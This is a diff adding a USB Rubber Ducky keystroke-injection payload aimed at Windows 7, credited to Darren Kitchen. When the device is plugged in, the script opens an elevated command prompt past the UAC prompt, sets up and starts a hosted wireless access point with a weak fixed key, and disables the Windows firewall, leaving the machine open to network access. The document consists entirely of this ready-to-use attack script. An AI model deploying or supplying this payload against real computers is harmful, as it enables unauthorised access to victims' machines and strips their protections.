@@ -1,0 +1,27 @@
+REM Info and source: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---wifi-backdoor
+REM Author: Darren Kitchen
+REM Target: Windows 7
+REM Description: Open a CMD bypassing UAC then create a wireless access point with the SSID noobcake and WPA key 12345678, then lower firewall.
+
+
+CONTROL ESCAPE
+DELAY 200
+STRING cmd
+DELAY 200
+MENU
+DELAY 100
+STRING a
+DELAY 100
+LEFTARROW
+ENTER
+DELAY 200
+STRING netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678
+ENTER
+DELAY 100
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable
+ENTER
+STRING exit
+ENTER
